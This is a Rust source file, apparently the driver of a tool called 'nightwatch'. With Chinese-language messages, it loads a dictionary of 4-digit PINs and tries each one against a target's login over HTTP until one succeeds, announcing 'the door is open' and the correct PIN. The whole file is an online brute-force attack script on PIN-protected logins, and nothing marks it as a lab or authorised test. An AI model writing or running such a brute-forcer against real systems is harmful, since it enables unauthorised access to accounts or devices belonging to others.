use nightwatch_core::{load_dict, parse_args, try_login};
use reqwest::blocking::Client;

fn main() {
    let (target, dict_path) = parse_args();
    let client = Client::new();

    // load_dict 现在返回 Result，需要用 match 处理
    let pins = match load_dict(&dict_path) {
        Ok(p) => p,
        Err(e) => {
            eprintln!("错误：{}", e);
            eprintln!("请检查：");
            eprintln!("  1. 字典文件 '{}' 是否存在", dict_path);
            eprintln!("  2. 文件内容是否为每行一个 4 位数字密码");
            std::process::exit(1);
        }
    };

    println!("目标: {}", target);
    println!("字典: {}", dict_path);
    println!("字典加载完成，共 {} 个密码，开始爆破...", pins.len());

    for (i, pin) in pins.iter().enumerate() {
        print!("[{}] 正在尝试: {} ... ", i + 1, pin);

        match try_login(&client, pin, &target) {
            Ok(true) => {
                println!(">>> 门开了！正确的 PIN 码是: {} <<<", pin);
                break;
            }
            Ok(false) => println!("错。继续。"),
            Err(e) => println!("网络炸了: {}，跳过这个继续下一个。", e),
        }
    }
}